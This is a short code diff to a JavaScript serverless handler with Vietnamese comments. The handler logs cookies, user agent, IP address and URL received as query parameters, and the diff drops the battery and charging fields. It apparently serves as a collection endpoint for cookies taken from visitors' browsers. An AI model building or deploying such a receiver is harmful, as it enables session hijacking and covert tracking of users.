@@ -5,17 +5,12 @@ exports.handler = async (event, context) => {
   const userAgent = event.queryStringParameters.userAgent || "No user agent";
   const userIP = event.queryStringParameters.userIP || "No IP";
   const url = event.queryStringParameters.url || "No URL";
-  const batteryLevel =
-    event.queryStringParameters.batteryLevel || "No battery level"; // Mức pin
-  const charging = event.queryStringParameters.charging || "No charging status"; // Trạng thái sạc
 
   // Ghi thông tin vào log
   console.log(`Cookies: ${cookies}`);
   console.log(`User Agent: ${userAgent}`);
   console.log(`IP: ${userIP}`);
-  console.log(`URL (Original URL): ${url}`);
-  console.log(`Battery Level: ${batteryLevel}%`);
-  console.log(`Charging Status: ${charging}`);
+  console.log(`URL: ${url}`);
 
   return {
     statusCode: 200,
